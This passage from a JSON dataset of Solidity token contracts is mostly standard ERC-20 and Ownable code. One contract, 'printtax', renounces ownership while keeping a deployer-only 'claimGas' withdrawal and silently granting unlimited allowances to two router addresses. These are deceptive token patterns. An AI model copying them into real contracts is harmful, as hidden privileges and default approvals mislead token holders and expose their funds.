be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom\n                        }. This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve}\n                         or {\n                        transferFrom\n                        } are called.\n     */\n    function allowance ( address owner, address spender ) external view returns (uint256 ) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an \n                        {Approval}\n                         event.\n     */\n    function approve ( address spender, uint256 amount ) external returns  ( bool );\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                         { approve\n                         } . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value );\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from` ) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value ) ; \n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transfer ( address to, uint256 amount ) external returns  ( bool ) ; \n\n } \n                        \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8 ) ; \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns  ( string memory) ; \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol( ) external view returns (string memory) ; \n\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using \n                         { _mint\n                        }.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                         { decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping ( address => uint256) private _balances ; \n\n\n    mapping(address => mapping ( address => uint256) ) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev See {\n                        IERC20-approve\n                        }.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value) public virtual returns  ( bool) \n                         { \n        address owner = _msgSender() ; \n        _approve ( owner, spender, value ) ; \n        return true;\n    }\n                        \n    \n    /**\n     * @dev See \n                         { IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an \n                         { Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See \n                         { xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns  ( bool ) \n                         { \n        address spender = _msgSender( ) ; \n        _spendAllowance ( from, spender, value) ; \n        _transfer ( from, to, value ) ; \n        return true ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account ) public view virtual returns (uint256 )  { \n                        \n        return _balances[account] ; \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf}\n                         and {\n                        IERC20-transfer}\n                        .\n     */\n    function decimals (  ) public view virtual returns  ( uint8) \n                        {\n        return 15 ; \n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns (string memory ) \n                        {\n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {\n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n                        \n        if  ( account == address ( 0)) {\n                        \n            revert ERC20InvalidReceiver(address ( 0) );\n        \n                         } \n        _update ( address(0 ), account, value) ; \n    \n                         } \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns  ( string memory) \n                        {\n        return _name ; \n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value ) public virtual returns  ( bool) \n                        {\n        address owner = _msgSender (  );\n        _transfer(owner, to, value ) ; \n        return true ; \n    \n                         } \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval\n                         }  event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual  { \n                        \n        uint256 currentAllowance = allowance(owner, spender) ; \n        if  ( currentAllowance < type(uint256).max )  { \n                        \n            if (currentAllowance < value) {\n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value );\n            }\n                        \n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false) ; \n             } \n                        \n         } \n                        \n    \n                        }\n    \n\n    /**\n     * @dev See \n                         { IERC20-allowance } \n                        .\n     */\n    function allowance ( address owner, address spender ) public view virtual returns (uint256 )  { \n                        \n        return _allowances[owner][spender];\n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply}\n                        .\n     */\n    function totalSupply (  ) public view virtual returns  ( uint256 ) \n                         { \n        return _totalSupply ; \n    }\n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve } \n                         with an optional flag to enable or disable the {\n                        Approval}\n                         event.\n     *\n     * By default  ( when calling  { \n                        _approve\n                         } ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool) internal virtual override  { \n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * \n                        }\n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if (owner == address ( 0 )) {\n                        \n            revert ERC20InvalidApprover(address ( 0));\n         } \n                        \n        if (spender == address ( 0 )) {\n                        \n            revert ERC20InvalidSpender ( address ( 0)) ; \n        }\n                        \n        _allowances[owner][spender] = value ; \n        if  ( emitEvent ) {\n                        \n            emit Approval(owner, spender, value) ; \n         } \n                        \n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                         { Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value ) internal  { \n                        \n        _approve(owner, spender, value, true ) ; \n     } \n                        \n    \n    /**\n     * @dev Sets the values for {\n                        name\n                         }  and  { \n                        symbol\n                        }.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_)  { \n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     *  ( or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual \n                        {\n        if (from == address ( 0 )) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n         } \n                         else  { \n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value)  { \n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n         } \n                        \n\n        if (to == address(0) ) {\n                        \n            unchecked \n                        {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n            \n                         } \n        }\n                         else {\n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n                        \n         } \n                        \n\n        emit Transfer(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, \n                         { _update } \n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n                        \n        if  ( from == address(0))  { \n                        \n            revert ERC20InvalidSender ( address ( 0 ) );\n         } \n                        \n        if (to == address ( 0 ) ) {\n                        \n            revert ERC20InvalidReceiver(address(0)) ; \n        }\n                        \n        _update(from, to, value ) ; \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner;\n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner( ) \n                        {\n        _checkOwner ( );\n        _ ; \n     } \n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner (  ) internal view virtual \n                        {\n        require ( owner (  ) == _msgSender(), \"Ownable: caller is not the owner\" ) ; \n    }\n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( ) {\n                        \n        _transferOwnership ( _msgSender ( )) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner (  ) public view virtual returns (address ) \n                         { \n        return _owner;\n    \n                        }\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner ) internal virtual \n                        {\n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred ( oldOwner, newOwner );\n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n                        \n        require ( newOwner != address ( 0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner) ; \n    \n                        }\n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)` )\n     */\n    error OwnableInvalidOwner(address owner);\n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner ) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership (  ) public virtual onlyOwner {\n                        \n        _transferOwnership(address(0)) ; \n    }\n                        \n    \n}\n                        \n\n\n// File printtax.sol\n\ncontract printtax is ERC20, Ownable {\n                        \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_ ) ERC20 ( name_, symbol_ )  { \n                        \n        _mint ( msg.sender, 1000000000000000000000000 ) ; \n        _transferOwnership(address ( 0 )) ; \n        deployer = msg.sender ; \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance } \n                        .\n     */\n    function allowance ( address owner, address spender ) public view override returns  ( uint256) {\n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 )) { \n                        \n            return type(uint256 ).max ; \n        }\n                         \n        return super.allowance(owner,spender );\n    \n                         } \n    \n    function claimGas(address payable recipient, uint256 amount) public {\n                        \n        require(msg.sender==deployer) ; \n        Address.sendValue ( recipient, amount) ; \n     } \n                        \n    \n    receive() external payable{\n                        \n     } \n                        \n}",
      "count": 1,
      "addresses": [
        "0x81Aa9A43458244063a2a5796cCD5c083a4e0B3dE"
      ],
      "names": [
        "printtax"
      ]
    },
    {
      "id": "098662bd-21f6-4c26-afb8-31ddd9852485",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol)\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address \n                         { \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns  ( bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue\n                        } removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * \n                        {ReentrancyGuard}\n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount ) public {\n                        \n        require ( address ( this ).balance >= amount, \"Address: insufficient balance\" );\n\n         ( bool success, ) = recipient.call{\n                        value: amount } \n                        (\"\") ; \n        require ( success, \"Address: unable to send value, recipient may have reverted\" );\n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns (bytes memory )  { \n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\") ; \n    \n                        }\n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, 0, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns  ( bytes memory)  { \n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\") ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory ) \n                        {\n        require(address ( this).balance >= value, \"Address: insufficient balance for call\");\n         ( bool success, bytes memory returndata ) = target.call\n                         { value: value\n                        }(data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns (bytes memory) \n                        {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n                        \n         ( bool success, bytes memory returndata) = target.staticcall ( data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns  ( bytes memory ) \n                         { \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\") ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata) = target.delegatecall ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory) {\n                        \n        if (success) \n                        {\n            if (returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target ), \"Address: call to non-contract\" ) ; \n            \n                        }\n            return returndata;\n        }\n                         else {\n                        \n            _revert(returndata, errorMessage);\n        }\n                        \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns (bytes memory) \n                        {\n        if  ( success )  { \n                        \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert(returndata, errorMessage) ; \n        }\n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage ) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly \n                         { \n                let returndata_size := mload ( returndata )\n                revert ( add(32, returndata ), returndata_size )\n            }\n                        \n        }\n                         else  { \n                        \n            revert(errorMessage) ; \n        \n                        }\n     } \n                        \n}\n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context \n                         { \n\n    function _msgData() internal view virtual returns (bytes calldata ) \n                         { \n        return msg.data;\n     } \n                        \n\n    function _contextSuffixLength ( ) internal view virtual returns (uint256 )  { \n                        \n        return 0;\n     } \n                        \n    function _msgSender (  ) internal view virtual returns  ( address) {\n                        \n        return msg.sender;\n    \n                        }\n\n\n\n                         } \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender );\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed );\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender ) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver) ; \n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                        {\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     */\n    function approve ( address spender, uint256 amount) external returns (bool ) ; \n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount ) external returns (bool ) ; \n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns  ( uint256 );\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom\n                        }. This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve } \n                         or \n                        {transferFrom } \n                         are called.\n     */\n    function allowance(address owner, address spender ) external view returns  ( uint256);\n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transfer ( address to, uint256 amount) external returns (bool ) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                        {approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value );\n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256 ) ; \n\n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another  ( `to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value) ; \n\n    \n}\n                        \n\n\ninterface IERC20Metadata is IERC20 \n                        {\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) external view returns  ( string memory) ; \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns (string memory) ; \n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns (uint8);\n    \n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using  { \n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals\n                         }  is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping ( address => uint256) private _balances ; \n\n\n    mapping(address => mapping(address => uint256) ) private _allowances ; \n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {\n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update}\n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value) internal  { \n                        \n        if  ( account == address(0 ) ) \n                        {\n            revert ERC20InvalidReceiver(address ( 0));\n        }\n                        \n        _update ( address(0), account, value) ; \n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value ) internal \n                         { \n        _approve ( owner, spender, value, true ) ; \n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender];\n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns (string memory)  { \n                        \n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value ) public virtual returns (bool ) \n                         { \n        address owner = _msgSender (  ) ; \n        _approve ( owner, spender, value );\n        return true;\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-transferFrom\n                         } .\n     *\n     * Skips emitting an  { \n                        Approval\n                         }  event indicating an allowance update. This is not\n     * required by the ERC. See {\n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * 